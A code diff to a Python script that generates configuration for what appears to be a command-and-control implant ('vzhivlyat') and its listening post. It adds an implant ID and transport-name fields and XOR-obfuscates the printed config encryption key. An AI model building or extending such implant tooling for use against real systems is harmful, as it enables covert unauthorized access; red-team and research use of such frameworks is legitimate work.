@@ -18,11 +18,14 @@ rc6_key = input(f"Listening post: [crypto/sym_key]: ")
 xor_key = input(f"Listening post: [crypto/xor_key]: ")
 lp_pubkey = input(f"Listening post's pubkey: ")
 implant_id = input(f"Vzhivlyat ID: ")
+transport_name = input(f"Transport name: ")
 task_check_time = input(f"task_check_time time: ")
 private_key = generate_private_key()
 
 print(f"Implant configuration:")
+print(f"[vzhivlyat][id]: {implant_id}")
 print(f"[vzhivlyat][task_check_time]: {task_check_time}")
+print(f"[vzhivlyat][transport_name]: {transport_name}")
 print(f"[crypto][implant_pubkey]: {private_key.public_key}")
 print(f"[crypto][lp_pk]: {lp_pubkey}")
 print(f"[crypto][sym_key]: {rc6_key}")
@@ -31,6 +34,8 @@ print(f"[crypto][priv_key]: {private_key}")
 
 config = configparser.RawConfigParser()
 config.add_section("vzhivlyat")
+config.set("vzhivlyat", "id", implant_id)
+config.set("vzhivlyat", "transport_name", transport_name)
 config.set("vzhivlyat", "task_check_time", task_check_time)
 
 config.add_section("crypto")
@@ -46,7 +51,7 @@ with open("shlyuz.conf", "w+") as unencrypted_configfile:
 
 # Write encrypted configuration
 config_encryption_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-print(f"Configuration encryption key: {config_encryption_key}")
+print(f"Configuration encryption key: {lib.crypto.xor.single_byte_xor(config_encryption_key.encode('utf-8'), 0x69)}")
 
 with open("shlyuz.conf", "rb+") as configfile:
     config_bytes = configfile.read()
